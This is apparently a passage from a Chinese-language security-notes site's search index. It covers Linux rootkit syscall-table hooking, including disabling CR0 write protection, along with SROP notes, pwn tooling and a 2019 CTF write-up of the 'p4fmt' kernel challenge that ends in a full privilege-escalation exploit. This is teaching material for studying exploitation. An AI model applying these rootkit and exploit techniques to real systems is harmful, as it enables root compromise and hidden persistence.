ia32_sys_call_table","title":"\u65b9\u6cd5\u4e09"},{"location":"security/pwn/rootkit/#_8","text":"\u6e90\u81ea\u65bc \u9019\u7bc7 \u7528 sidt \u9019\u500b\u6307\u4ee4\u7372\u53d6 Interrupt Descriptor Table (IDT) \u7684\u4f4d\u5740 IDT \u4e0a\u7684\u7b2c 0x80 \u500b\u6b04\u4f4d\u5b58\u6709 system_call \u7684\u4f4d\u5740 system_call \u88e1\u9762\u7684\u5176\u4e2d\u4e00\u884c\u6307\u4ee4 call sys_call_table(,eax,4) \u6709\u7528\u5230 sys_call_table \u6240\u4ee5\u5728 system_call \u88e1\u9762\u67e5\u627e\u90a3\u4e00\u884c\u6307\u4ee4\u7684\u982d\u4e09\u500b byte \\xff\\x14\\x85 \uff0c\u5f8c\u9762\u5c31\u662f\u6211\u5011\u8981\u7684 sys_call_table","title":"\u65b9\u6cd5\u56db"},{"location":"security/pwn/rootkit/#_9","text":"\u4f7f\u7528 kallsyms_lookup_name #include <linux/kallsyms.h> static void ** sys_call_table ; static int __init hook_init ( void ) { sys_call_table = ( void ** ) kallsyms_lookup_name ( \"sys_call_table\" ); printk ( KERN_INFO \"sys_call_table = 0x%px \\n \" , sys_call_table ); return 0 ; } printk a pointer[^6] \u8981\u7528 printk \u5370\u51fa pointer \u53ef\u4ee5\u7528 %px %p \u53ea\u6703\u5370\u51fa\u8a72\u6307\u6a19\u7684\u96dc\u6e4a\u503c\u800c\u4e0d\u662f\u771f\u6b63\u7684\u6307\u6a19\u7684\u503c\uff0c\u9019\u662f\u70ba\u4e86\u907f\u514d\u6d29\u6f0f\u5167\u6838\u4f4d\u5740","title":"\u65b9\u6cd5\u4e94"},{"location":"security/pwn/rootkit/#sys_call_table_1","text":"\u56e0\u70ba sys_call_table \u662f\u552f\u8b80\u7684\uff0c\u6240\u4ee5\u6211\u5011\u900f\u904e\u4fee\u6539 cr0 \u4f86\u95dc\u9589\u5beb\u5165\u4fdd\u8b77 void writable_unlock ( void ) { write_cr0 ( read_cr0 () & ( ~ X86_CR0_WP )); } void writable_lock ( void ) { write_cr0 ( read_cr0 () | X86_CR0_WP ); } \u672a\u5b8c\u5f85\u7e8c http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/ \u21a9 https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/ \u21a9 https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/gnu_linux.html \u21a9 https://www.kernel.org/doc/Documentation/printk-formats.txt \u21a9 https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/ \u21a9","title":"\u8b93 sys_call_table \u53ef\u4ee5\u5beb\u5165"},{"location":"security/pwn/srop/","text":"Signal \u4e00\u652f\u7a0b\u5f0f\u63a5\u5230 signal \u5f8c 1. kernel \u6703\u5e6b\u4f60\u628a\u4e0a\u4e0b\u6587 ( \u5404\u7a2e\u66ab\u5b58\u5668 ) \u4fdd\u7559\u5230 stack \u4e0a\uff0c\u53eb\u505a Signal Frame 2. \u8df3\u56de user mode\uff0c\u8b93 signal handler \u8655\u7406 3. signal handler \u8655\u7406\u5b8c\u6703 return \u56de __restore_rt \uff0c\u9019\u500b function \u88e1\u9762\u5c31\u662f mov rax, 0xf; syscall \uff0c\u53bb\u547c\u53eb sys_rt_sigreturn syscall\uff0c\u628a\u4e0a\u4e0b\u6587\u6062\u5fa9 Signal Frame SigReturn ROP \u5728\u505a ROP \u7684\u6642\u5019\u9700\u8981\u8a2d\u5b9a\u8a31\u591a\u66ab\u5b58\u5668\u7684\u503c \u9019\u6642\u5019\u5c31\u53ef\u4ee5\u7528 SROP \u7684\u6280\u5de7 \u81ea\u5df1\u5728 stack \u4e0a\u64fa\u597d Signal Frame\uff0c\u7136\u5f8c\u547c\u53eb sys_rt_sigreturn syscall \u5c31\u53ef\u4ee5\u4e00\u6b21\u8a2d\u5b9a\u597d\u6240\u6709\u7684\u66ab\u5b58\u5668 \u7f3a\u9ede\u662f\u9700\u8981\u5920\u5927\u7684\u7a7a\u9593\u585e\u4e0b\u6574\u500b Signal Frame sys_rt_sigreturn syscall gadget \u54ea\u88e1\u6709 mov rax, 0xf; syscall \u7684 gadget \u53ef\u4ee5\u7528 libc \u88e1\u9762\u7684 __restore_rt \u81ea\u5df1\u7528 ROP \u8a2d\u5b9a\u597d rax, \u518d\u63a5 syscall gadget pwntools SigFrame frame = SigreturnFrame () frame . rsp = 0 frame . rax = 0 frame . rdi = 0 frame . rsi = 0 frame . rdx = 0 frame . rip = 0 rop = bytes ( frame ) CTF \u984c\u76ee pwnable.kr - unexploitable https://www.slideshare.net/AngelBoy1/sigreturn-ori \u21a9 http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/ \u21a9","title":"SROP ( Sigreturn Oriented Programming )"},{"location":"security/pwn/srop/#signal","text":"\u4e00\u652f\u7a0b\u5f0f\u63a5\u5230 signal \u5f8c 1. kernel \u6703\u5e6b\u4f60\u628a\u4e0a\u4e0b\u6587 ( \u5404\u7a2e\u66ab\u5b58\u5668 ) \u4fdd\u7559\u5230 stack \u4e0a\uff0c\u53eb\u505a Signal Frame 2. \u8df3\u56de user mode\uff0c\u8b93 signal handler \u8655\u7406 3. signal handler \u8655\u7406\u5b8c\u6703 return \u56de __restore_rt \uff0c\u9019\u500b function \u88e1\u9762\u5c31\u662f mov rax, 0xf; syscall \uff0c\u53bb\u547c\u53eb sys_rt_sigreturn syscall\uff0c\u628a\u4e0a\u4e0b\u6587\u6062\u5fa9 Signal Frame","title":"Signal"},{"location":"security/pwn/srop/#sigreturn-rop","text":"\u5728\u505a ROP \u7684\u6642\u5019\u9700\u8981\u8a2d\u5b9a\u8a31\u591a\u66ab\u5b58\u5668\u7684\u503c \u9019\u6642\u5019\u5c31\u53ef\u4ee5\u7528 SROP \u7684\u6280\u5de7 \u81ea\u5df1\u5728 stack \u4e0a\u64fa\u597d Signal Frame\uff0c\u7136\u5f8c\u547c\u53eb sys_rt_sigreturn syscall \u5c31\u53ef\u4ee5\u4e00\u6b21\u8a2d\u5b9a\u597d\u6240\u6709\u7684\u66ab\u5b58\u5668 \u7f3a\u9ede\u662f\u9700\u8981\u5920\u5927\u7684\u7a7a\u9593\u585e\u4e0b\u6574\u500b Signal Frame","title":"SigReturn ROP"},{"location":"security/pwn/srop/#sys_rt_sigreturn-syscall-gadget","text":"\u54ea\u88e1\u6709 mov rax, 0xf; syscall \u7684 gadget \u53ef\u4ee5\u7528 libc \u88e1\u9762\u7684 __restore_rt \u81ea\u5df1\u7528 ROP \u8a2d\u5b9a\u597d rax, \u518d\u63a5 syscall gadget","title":"sys_rt_sigreturn syscall gadget"},{"location":"security/pwn/srop/#pwntools-sigframe","text":"frame = SigreturnFrame () frame . rsp = 0 frame . rax = 0 frame . rdi = 0 frame . rsi = 0 frame . rdx = 0 frame . rip = 0 rop = bytes ( frame )","title":"pwntools SigFrame"},{"location":"security/pwn/srop/#ctf","text":"pwnable.kr - unexploitable https://www.slideshare.net/AngelBoy1/sigreturn-ori \u21a9 http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/ \u21a9","title":"CTF \u984c\u76ee"},{"location":"security/pwn/tools/","text":"\u5e38\u7528\u6307\u4ee4\u8207\u5de5\u5177 \u6307\u4ee4 nm - list symbols from object files ldd - print shared object dependencies strip - Discard symbols from object files hexedit - view and edit files in hexadecimal or in ASCII readelf - Displays information about ELF files objdump - display information from object files execstack - tool to set, clear, or query executable stack flag of ELF binaries and shared libraries checksec - list binary protection ( comes from pwntools ) elfdiff - diff elf binary ( comes from pwntools ) \u5de5\u5177 pwntools one_gadget seccomp-tools","title":"\u5e38\u7528\u6307\u4ee4\u8207\u5de5\u5177"},{"location":"security/pwn/tools/#_1","text":"","title":"\u5e38\u7528\u6307\u4ee4\u8207\u5de5\u5177"},{"location":"security/pwn/tools/#_2","text":"nm - list symbols from object files ldd - print shared object dependencies strip - Discard symbols from object files hexedit - view and edit files in hexadecimal or in ASCII readelf - Displays information about ELF files objdump - display information from object files execstack - tool to set, clear, or query executable stack flag of ELF binaries and shared libraries checksec - list binary protection ( comes from pwntools ) elfdiff - diff elf binary ( comes from pwntools )","title":"\u6307\u4ee4"},{"location":"security/pwn/tools/#_3","text":"pwntools one_gadget seccomp-tools","title":"\u5de5\u5177"},{"location":"security/pwn/heap/house-of-force/","text":"","title":"House of Force"},{"location":"security/pwn/heap/house-of-orange/","text":"","title":"House of Orange"},{"location":"security/pwn/writeups/p4fmt/","text":"Kernel challs are always a bit painful. No internet access, no SSH, no file copying. You\u2019re stuck with copy pasting base64\u2019d (sometimes static) ELFs. But what if there was another solution? We\u2019ve created a lightweight, simple binary format for your pwning pleasure. It\u2019s time to prove your skills. nc p4fmt.zajebistyc.tf 30002 \u5206\u6578 : 304 \u89e3\u984c\u4eba\u6578 : 10 Writeup \u984c\u76ee\u6a94\u6848\u89e3\u58d3\u7e2e\u5f8c\u6709\u4e09\u500b\u6a94\u6848 bzImage , initramfs.cpio.gz , run.sh bzImage \u662f\u58d3\u7e2e\u904e\u7684 linux kernel initramfs.cpio.gz \u662f\u81e8\u6642\u7684\u6a94\u6848\u7cfb\u7d71 run.sh \u88e1\u9762\u7528 qemu-system-x86_64 \u628a kernel \u8dd1\u8d77\u4f86 \u4e0d\u719f\u6089 linux kernel debug \u53ef\u4ee5\u53c3\u8003 Debug Kernel First Glance run.sh \u8dd1\u8d77\u4f86\u5f8c\u5c31\u6703\u8dd1 linux kernel \u5f48\u51fa\u4e00\u500b shell ls \u4e00\u4e0b\u53ef\u4ee5\u770b\u5230\u4e09\u500b\u6bd4\u8f03\u91cd\u8981\u7684\u6a94\u6848 init , p4fmt.ko , flag \u76f4\u63a5\u5617\u8a66 cat flag \u6703\u5f97\u5230 Permission denied \u56e0\u70ba\u6211\u5011\u62ff\u5230\u7684\u4f7f\u7528\u8005\u662f pwn \u800c flag \u53ea\u6709 root \u6709\u6b0a\u9650\u8b80 init \u88e1\u9762\u6709\u4e00\u884c insmod /p4fmt.ko \u52a0\u8f09 p4fmt.ko \u9019\u500b\u5167\u6838\u6a21\u584a \u770b\u4f86\u6211\u5011\u7684\u76ee\u6a19\u5c31\u662f\u5229\u7528 p4fmt.ko \u88e1\u9762\u7684\u6f0f\u6d1e\u63d0\u6b0a\u62ff root \u6b0a\u9650\uff0c\u5c31\u53ef\u4ee5 cat flag \u4e86 \u524d\u7f6e\u4f5c\u696d \u89e3\u58d3 initramfs.cpio.gz \u53ef\u4ee5\u5148\u7528 binwalk \u628a initramfs.cpio.gz \u7684\u6a94\u6848\u7cfb\u7d71\u62c9\u51fa\u4f86 x initramfs.cpio.gz binwalk -e initramfs.cpio \u4fee\u6539 init 27 setsid cttyhack su root \u4fee\u6539 init \u8b93\u6211\u5011\u6709 root \u6b0a\u9650\uff0c\u9019\u6a23\u624d\u770b\u5f97\u5230 p4fmt.ko \u5167\u6838\u6a21\u584a\u8f09\u5165\u5f8c\u7684\u4f4d\u5740\uff0c\u7b49\u7b49\u624d\u65b9\u4fbf\u4e0b\u65b7\u9ede \u4fee\u6539\u5b8c\u91cd\u65b0\u6253\u5305 initramfs.cpio.gz find . -print0 | cpio --null --create --format = newc | gzip --best > ../initramfs.cpio.gz \u4fee\u6539 run.sh 5 -gdb tcp:127.0.0.1:6666 \u958b\u4e86 gdb server \u5f8c\uff0c\u5c31\u53ef\u4ee5\u7528 gdb \u9023\u4e0a\u53bb debug \u4e86 \u9996\u5148\u5148\u53d6\u5f97 p4fmt \u5167\u6838\u6a21\u584a\u7684\u4f4d\u5740 \u53ef\u4ee5\u7528 lsmod \u6216 cat /proc/modules ( \u5fc5\u9808\u6709 root \u6b0a\u9650 ) gdb ( gdb ) target remote :6666 ( gdb ) add-symbol-file p4fmt.ko 0xffffffffc0288000 ( gdb ) b load_p4_binary # \u9019\u662f p4fmt \u4e3b\u8981\u7684\u51fd\u5f0f\u7b49\u7b49\u9006\u5411\u6703\u770b\u5230 \u53d6\u5f97 p4fmt \u4f4d\u5740 / # lsmod p4fmt 16384 0 - Live 0xffffffffc0288000 ( O ) / # cat /proc/modules p4fmt 16384 0 - Live 0xffffffffc0288000 ( O ) \u9006\u5411 \u8d77\u624b\u5f0f\u4e00\u6a23 IDA \u6253\u958b ( \u597d\u50cf\u5f88\u591a\u4eba\u6539\u7528 ghidra \u4e86 O_O ) \u4f46\u662f\u9019\u6b21\u7684\u53cd\u7de8\u8b6f\u6709\u9ede\u7cdf\uff0c\u5927\u90e8\u5206\u9084\u662f\u770b\u7d44\u8a9e\u914d gdb \u9019\u500b\u5167\u6838\u6a21\u584a\u4e3b\u8981\u7684\u529f\u80fd\u5c31\u662f\u8a3b\u518a\u4e00\u500b\u65b0\u7684\u57f7\u884c\u6a94\u683c\u5f0f ( binary format ) int __init p4fmt_init ( void ) { _register_binfmt ( & p4format , 1 ); } void __exit p4fmt_init ( void ) { unregister_binfmt ( & p4format ); } p4format \u662f\u4e00\u500b linux_binfmt \u7684\u7d50\u69cb struct linux_binfmt { struct list_head lh ; struct module * module ; int ( * load_binary )( struct linux_binprm * ); int ( * load_shlib )( struct file * ); int ( * core_dump )( struct coredump_params * cprm ); unsigned long min_coredump ; /* minimal dump size */ } __randomize_layout ; \u5176\u4e2d\u7684 load_binary \u9019\u500b\u6307\u6a19\u5c31\u662f\u6307\u5411\u8ca0\u8cac\u5efa\u7acb\u74b0\u5883\u628a\u7a0b\u5f0f\u8dd1\u8d77\u4f86\u7684\u51fd\u5f0f \u800c\u5728\u9019\u88e1\u5c31\u662f\u6307\u5411 load_p4_binary \u9019\u500b\u51fd\u5f0f ( \u4e00\u822c\u7684 ELF \u57f7\u884c\u6a94\u662f load_elf_binary ) int load_p4_binary ( linux_binprm * bprm ) { ... } linux_binprm \u6703\u5148\u8b80\u6a94\u6848\u7684\u524d 128 bytes \u653e\u9032 bprm->buf \u56e0\u70ba\u6709\u9019\u500b\u7d50\u69cb\u6709 __randomize_layout \uff0c\u6240\u4ee5\u7d50\u69cb\u6210\u54e1\u7684\u9806\u5e8f\u662f\u96a8\u6a5f\u7684 \u9019\u984c\u7684 bprm->buf \u5f9e 0x48 \u958b\u59cb 128 bytes\uff0c\u53ef\u898b\u4e0b\u5716 \u7a0b\u5f0f\u4e00\u958b\u59cb\u6703\u5148\u6aa2\u67e5\u524d\u5169\u500b bytes \u662f\u4e0d\u662f P4 \u63a5\u8457\u6aa2\u67e5\u7b2c\u4e09\u500b byte \u662f\u4e0d\u662f \\x00 \uff0c\u4e0d\u662f\u7684\u8a71\u6703\u5674 Unknown version \u63a5\u8457\u7b2c\u56db\u500b byte \u53ef\u4ee5\u662f \\x00 \u6216 \\x01 \uff0c \\x00 \u7684\u8a71\u6703\u9032\u7c21\u55ae\u7684\u8def\u7dda\uff0c \\x01 \u6703\u9032\u8907\u96dc\u7684\u8def\u7dda \u63a5\u8457\u56db\u500b bytes \u4ee3\u8868\u5f8c\u9762\u6709\u5e7e\u500b mapping \u63a5\u8457\u516b\u500b bytes \u4ee3\u8868 mapping \u7684\u958b\u982d\u5728 buf \u7684 offset \u63a5\u8457\u516b\u500b bytes \u64fa\u7684\u662f entry point \u7684\u4f4d\u5740 \u5176\u4ed6\u7684\u90e8\u5206\u57fa\u672c\u4e0a\u8ddf load_elf_binary \u4e00\u6a23 simple vm_mmap ( bprm -> file , * ( QWORD * )( bprm + 0x50 ), 0x1000 , * ( QWORD * )( bprm + 0x50 ) & 7 , 2 , 0 ); complex struct p4_mapping { long load_addr ; long length ; long offset ; }; int mapping_count = * ( int * )( bprm -> buf + 4 ); long mapping_offset = * ( long * )( bprm -> buf + 8 ); p4_mapping * mapping = bprm -> buf + mapping_offset ; for ( int i = 0 ; i < mapping_count ; i ++ , mapping ++ ) { long addr = mapping -> load_addr & 0xFFFFFFFFFFFFF000 ; long prot = mapping -> load_addr & 7 ; printk ( \"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d) \\n \" , addr , mapping -> length , mapping -> offset , prot ); if ( mapping -> load_addr & 8 ) { // \u9019\u88e1\u5c31\u662f\u8981\u521d\u59cb\u5316\u4e00\u6bb5\u8a18\u61b6\u9ad4\uff0c\u985e\u4f3c .bss \u6bb5 vm_mmap ( 0 , addr , mapping -> length , prot , 2 , mapping -> offset ); printk ( \"clear_user(addr=0x%llx, length=0x%llx) \\n \" , mapping -> load_addr , mapping -> length ); _clear_user ( mapping -> load_addr , mapping -> length ); } else { // \u9019\u88e1\u662f\u8981\u628a\u6a94\u6848\u639b\u4e0a\u53bb\uff0c\u985e\u4f3c .text \u6bb5 vm_mmap ( bprm -> file , addr , mapping -> length , prot , 2 , mapping -> offset ); } } \u6f0f\u6d1e mapping_count \u6539\u5927\u53ef\u4ee5 leak linux_binprm \u5176\u4ed6\u6b04\u4f4d\u7684\u503c _clear_user \u6c92\u6709\u6aa2\u67e5\uff0c\u53ef\u4ee5\u628a kernel \u4e0a\u4efb\u610f\u4f4d\u5740\u7684\u503c\u6e05\u7a7a linux_binprm \u6709\u4e00\u500b cred \u7684\u7d50\u69cb\uff0c\u88e1\u9762\u5b58\u7684\u5c31\u662f uid, gid \u6240\u4ee5\u6211\u5011\u53ea\u8981 leak \u51fa\u9019\u500b cred \u7684\u4f4d\u5740\uff0c\u7136\u5f8c\u7528 _clear_user \u6e05\u6210 0\uff0c\u6211\u5011\u7684\u7a0b\u5f0f\u5c31\u662f root \u6b0a\u9650\u4e86 ( root \u7684 uid \u662f 0 ) \u5617\u8a66 #!/usr/bin/env python3 from pwn import * from base64 import b64encode context . arch = \"amd64\" payload = b \"P4\" # magic payload += p8 ( 0 ) # version payload += p8 ( 1 ) # type payload += p32 ( 1 ) # mapping_count payload += p64 ( 0x18 ) # mapping_offset payload += p64 ( 0x400030 ) # entry # mapping payload += flat ( 0x400000 | 7 , 0x1000 , 0 ) payload += asm ( shellcraft . echo ( \"test \\n \" ) + shellcraft . exit ()) print ( f 'echo {b64encode(payload).decode()} | base64 -d > a ; chmod +x a ; ./a' ) \u5148\u5beb\u500b\u7c21\u55ae\u7684 p4 \u683c\u5f0f\u7684\u57f7\u884c\u6a94\u6e2c\u8a66\u4e00\u4e0b\u6211\u5011\u7684\u7406\u89e3\u662f\u4e0d\u662f\u5c0d\u7684 command echo UDQAAQEAAAAYAAAAAAAAADAAQAAAAAAABwBAAAAAAAAAEAAAAAAAAAAAAAAAAAAASLgBAQEBAQEBAVBIuHVkcnULAQEBSDEEJGoBWGoBX2oFWkiJ5g8FajxYDwU = | base64 -d > a ; chmod +x a ; ./a output [ 50353 .170813 ] vm_mmap ( load_addr = 0x400000, length = 0x1000, offset = 0x0, prot = 7 ) test \u63a5\u4e0b\u4f86\u8981\u627e cred \u7684\u4f4d\u5740\uff0c\u56e0\u70ba pwn \u7684 uid \u662f 1000 ( = 0x3e8 ) \u6240\u4ee5\u6211\u5011\u628a\u4f7f\u7528\u8005\u5207\u63db\u6210 pwn \uff0c\u5207\u6210 pwn \u4e4b\u5f8c\u8981\u5728 /tmp \u624d\u53ef\u4ee5\u5beb\u6a94 \u7136\u5f8c\u628a mapping_count \u6539\u5927\u4e00\u9ede\uff0c\u6bd4\u5982 6 \uff0c\u5728\u4ed6\u5370\u51fa\u7684\u4f4d\u5740\u6307\u5411\u7684\u503c\u4e2d\u627e 0x3e8 [ 50800 .668734 ] vm_mmap ( load_addr = 0x400000, length = 0x1000, offset = 0x0, prot = 7 ) [ 50800 .674080 ] vm_mmap ( load_addr = 0x10101010101b000, length = 0x726475b848500101, offset = 0x431480101010b75, prot = 0 ) [ 50800 .674550 ] clear_user ( addr = 0x10101010101b848, length = 0x726475b848500101 ) [ 50800 .675372 ] vm_mmap ( load_addr = 0x6a5f016a58016000, length = 0x6a050fe689485a05, offset = 0x50f583c, prot = 4 ) [ 50800 .675786 ] vm_mmap ( load_addr = 0x0, length = 0x0, offset = 0x0, prot = 0 ) [ 50800 .676003 ] vm_mmap ( load_addr = 0x0, length = 0x7fffffffef99, offset = 0x100000001, prot = 0 ) [ 50800 .676260 ] vm_mmap ( load_addr = 0x0, length = 0xffffa1c307595b40, offset = 0x0, prot = 0 ) test \u627e\u4e86\u4e00\u627e\u767c\u73fe\u5728\u7b2c\u516d\u500b vm_mmap \u7684 0xffffa1c307595b40 \u9019\u500b\u4f4d\u5740\u662f cred \u4f46\u662f\u9019\u500b\u4f4d\u5740\u6bcf\u6b21\u8dd1\u8d77\u4f86\u90fd\u4e0d\u4e00\u6a23\uff0c\u4e0d\u904e\u591a\u8dd1\u5e7e\u6b21\u6703\u767c\u73fe\uff0c\u9019\u500b\u503c\u6703\u4e00\u76f4\u5faa\u74b0\u91cd\u8907\u5229\u7528\uff0c\u6240\u4ee5\u53ea\u8981\u591a\u8dd1\u5e7e\u6b21\u5c31\u6703\u5c0d\u4e86 Final Exploit #!/usr/bin/env python3 from pwn import * from base64 import b64encode context . arch = \"amd64\" payload = b \"P4\" # magic payload += p8 ( 0 ) # version payload += p8 ( 1 ) # type payload += p32 ( 2 ) # mapping_count payload += p64 ( 0x18 ) # mapping_offset payload += p64 ( 0x400048 ) # entry leak_cred = 0xffff9855c758c0c0 # mapping payload += flat ( 0x400000 | 7 , 0x1000 , 0 , ( leak_cred | 8 ) + 0x10 , 0x20 , 0 ) payload += asm ( shellcraft . cat ( \"/flag\" ) + shellcraft . exit ()) print ( f 'echo {b64encode(payload).decode()} | base64 -d > a ; chmod +x a ; ./a' ) https://github.com/david942j/ctf-writeups/tree/master/teaser-confidence-quals-2019/p4fmt \u21a9 https://devcraft.io/2019/03/19/p4fmt-confidence-ctf-2019-teaser.html \u21a9 https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/ \u21a9","title":"[2019] Teaser Confidence Quals - p4fmt"},{"location":"security/pwn/writeups/p4fmt/#writeup","text":"\u984c\u76ee\u6a94\u6848\u89e3\u58d3\u7e2e\u5f8c\u6709\u4e09\u500b\u6a94\u6848 bzImage , initramfs.cpio.gz , run.sh bzImage \u662f\u58d3\u7e2e\u904e\u7684 linux kernel initramfs.cpio.gz \u662f\u81e8\u6642\u7684\u6a94\u6848\u7cfb\u7d71 run.sh \u88e1\u9762\u7528 qemu-system-x86_64 \u628a kernel \u8dd1\u8d77\u4f86 \u4e0d\u719f\u6089 linux kernel debug \u53ef\u4ee5\u53c3\u8003 Debug Kernel","title":"Writeup"},{"location":"security/pwn/writeups/p4fmt/#first-glance","text":"run.sh \u8dd1\u8d77\u4f86\u5f8c\u5c31\u6703\u8dd1 linux kernel \u5f48\u51fa\u4e00\u500b shell ls \u4e00\u4e0b\u53ef\u4ee5\u770b\u5230\u4e09\u500b\u6bd4\u8f03\u91cd\u8981\u7684\u6a94\u6848 init , p4fmt.ko , flag \u76f4\u63a5\u5617\u8a66 cat flag \u6703\u5f97\u5230 Permission denied \u56e0\u70ba\u6211\u5011\u62ff\u5230\u7684\u4f7f\u7528\u8005\u662f pwn \u800c flag \u53ea\u6709 root \u6709\u6b0a\u9650\u8b80 init \u88e1\u9762\u6709\u4e00\u884c insmod /p4fmt.ko \u52a0\u8f09 p4fmt.ko \u9019\u500b\u5167\u6838\u6a21\u584a \u770b\u4f86\u6211\u5011\u7684\u76ee\u6a19\u5c31\u662f\u5229\u7528 p4fmt.ko \u88e1\u9762\u7684\u6f0f\u6d1e\u63d0\u6b0a\u62ff root \u6b0a\u9650\uff0c\u5c31\u53ef\u4ee5 cat flag \u4e86","title":"First Glance"},{"location":"security/pwn/writeups/p4fmt/#_1","text":"","title":"\u524d\u7f6e\u4f5c\u696d"},{"location":"security/pwn/writeups/p4fmt/#initramfscpiogz","text":"\u53ef\u4ee5\u5148\u7528 binwalk \u628a initramfs.cpio.gz \u7684\u6a94\u6848\u7cfb\u7d71\u62c9\u51fa\u4f86 x initramfs.cpio.gz binwalk -e initramfs.cpio","title":"\u89e3\u58d3 initramfs.cpio.gz"},{"location":"security/pwn/writeups/p4fmt/#init","text":"27 setsid cttyhack su root \u4fee\u6539 init \u8b93\u6211\u5011\u6709 root \u6b0a\u9650\uff0c\u9019\u6a23\u624d\u770b\u5f97\u5230 p4fmt.ko \u5167\u6838\u6a21\u584a\u8f09\u5165\u5f8c\u7684\u4f4d\u5740\uff0c\u7b49\u7b49\u624d\u65b9\u4fbf\u4e0b\u65b7\u9ede \u4fee\u6539\u5b8c\u91cd\u65b0\u6253\u5305 initramfs.cpio.gz find . -print0 | cpio --null --create --format = newc | gzip --best > ../initramfs.cpio.gz","title":"\u4fee\u6539 init"},{"location":"security/pwn/writeups/p4fmt/#runsh","text":"5 -gdb tcp:127.0.0.1:6666 \u958b\u4e86 gdb server \u5f8c\uff0c\u5c31\u53ef\u4ee5\u7528 gdb \u9023\u4e0a\u53bb debug \u4e86 \u9996\u5148\u5148\u53d6\u5f97 p4fmt \u5167\u6838\u6a21\u584a\u7684\u4f4d\u5740 \u53ef\u4ee5\u7528 lsmod \u6216 cat /proc/modules ( \u5fc5\u9808\u6709 root \u6b0a\u9650 ) gdb ( gdb ) target remote :6666 ( gdb ) add-symbol-file p4fmt.ko 0xffffffffc0288000 ( gdb ) b load_p4_binary # \u9019\u662f p4fmt \u4e3b\u8981\u7684\u51fd\u5f0f\u7b49\u7b49\u9006\u5411\u6703\u770b\u5230 \u53d6\u5f97 p4fmt \u4f4d\u5740 / # lsmod p4fmt 16384 0 - Live 0xffffffffc0288000 ( O ) / # cat /proc/modules p4fmt 16384 0 - Live 0xffffffffc0288000 ( O )","title":"\u4fee\u6539 run.sh"},{"location":"security/pwn/writeups/p4fmt/#_2","text":"\u8d77\u624b\u5f0f\u4e00\u6a23 IDA \u6253\u958b ( \u597d\u50cf\u5f88\u591a\u4eba\u6539\u7528 ghidra \u4e86 O_O ) \u4f46\u662f\u9019\u6b21\u7684\u53cd\u7de8\u8b6f\u6709\u9ede\u7cdf\uff0c\u5927\u90e8\u5206\u9084\u662f\u770b\u7d44\u8a9e\u914d gdb \u9019\u500b\u5167\u6838\u6a21\u584a\u4e3b\u8981\u7684\u529f\u80fd\u5c31\u662f\u8a3b\u518a\u4e00\u500b\u65b0\u7684\u57f7\u884c\u6a94\u683c\u5f0f ( binary format ) int __init p4fmt_init ( void ) { _register_binfmt ( & p4format , 1 ); } void __exit p4fmt_init ( void ) { unregister_binfmt ( & p4format ); } p4format \u662f\u4e00\u500b linux_binfmt \u7684\u7d50\u69cb struct linux_binfmt { struct list_head lh ; struct module * module ; int ( * load_binary )( struct linux_binprm * ); int ( * load_shlib )( struct file * ); int ( * core_dump )( struct coredump_params * cprm ); unsigned long min_coredump ; /* minimal dump size */ } __randomize_layout ; \u5176\u4e2d\u7684 load_binary \u9019\u500b\u6307\u6a19\u5c31\u662f\u6307\u5411\u8ca0\u8cac\u5efa\u7acb\u74b0\u5883\u628a\u7a0b\u5f0f\u8dd1\u8d77\u4f86\u7684\u51fd\u5f0f \u800c\u5728\u9019\u88e1\u5c31\u662f\u6307\u5411 load_p4_binary \u9019\u500b\u51fd\u5f0f ( \u4e00\u822c\u7684 ELF \u57f7\u884c\u6a94\u662f load_elf_binary ) int load_p4_binary ( linux_binprm * bprm ) { ... } linux_binprm \u6703\u5148\u8b80\u6a94\u6848\u7684\u524d 128 bytes \u653e\u9032 bprm->buf \u56e0\u70ba\u6709\u9019\u500b\u7d50\u69cb\u6709 __randomize_layout \uff0c\u6240\u4ee5\u7d50\u69cb\u6210\u54e1\u7684\u9806\u5e8f\u662f\u96a8\u6a5f\u7684 \u9019\u984c\u7684 bprm->buf \u5f9e 0x48 \u958b\u59cb 128 bytes\uff0c\u53ef\u898b\u4e0b\u5716 \u7a0b\u5f0f\u4e00\u958b\u59cb\u6703\u5148\u6aa2\u67e5\u524d\u5169\u500b bytes \u662f\u4e0d\u662f P4 \u63a5\u8457\u6aa2\u67e5\u7b2c\u4e09\u500b byte \u662f\u4e0d\u662f \\x00 \uff0c\u4e0d\u662f\u7684\u8a71\u6703\u5674 Unknown version \u63a5\u8457\u7b2c\u56db\u500b byte \u53ef\u4ee5\u662f \\x00 \u6216 \\x01 \uff0c \\x00 \u7684\u8a71\u6703\u9032\u7c21\u55ae\u7684\u8def\u7dda\uff0c \\x01 \u6703\u9032\u8907\u96dc\u7684\u8def\u7dda \u63a5\u8457\u56db\u500b bytes \u4ee3\u8868\u5f8c\u9762\u6709\u5e7e\u500b mapping \u63a5\u8457\u516b\u500b bytes \u4ee3\u8868 mapping \u7684\u958b\u982d\u5728 buf \u7684 offset \u63a5\u8457\u516b\u500b bytes \u64fa\u7684\u662f entry point \u7684\u4f4d\u5740 \u5176\u4ed6\u7684\u90e8\u5206\u57fa\u672c\u4e0a\u8ddf load_elf_binary \u4e00\u6a23 simple vm_mmap ( bprm -> file , * ( QWORD * )( bprm + 0x50 ), 0x1000 , * ( QWORD * )( bprm + 0x50 ) & 7 , 2 , 0 ); complex struct p4_mapping { long load_addr ; long length ; long offset ; }; int mapping_count = * ( int * )( bprm -> buf + 4 ); long mapping_offset = * ( long * )( bprm -> buf + 8 ); p4_mapping * mapping = bprm -> buf + mapping_offset ; for ( int i = 0 ; i < mapping_count ; i ++ , mapping ++ ) { long addr = mapping -> load_addr & 0xFFFFFFFFFFFFF000 ; long prot = mapping -> load_addr & 7 ; printk ( \"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d) \\n \" , addr , mapping -> length , mapping -> offset , prot ); if ( mapping -> load_addr & 8 ) { // \u9019\u88e1\u5c31\u662f\u8981\u521d\u59cb\u5316\u4e00\u6bb5\u8a18\u61b6\u9ad4\uff0c\u985e\u4f3c .bss \u6bb5 vm_mmap ( 0 , addr , mapping -> 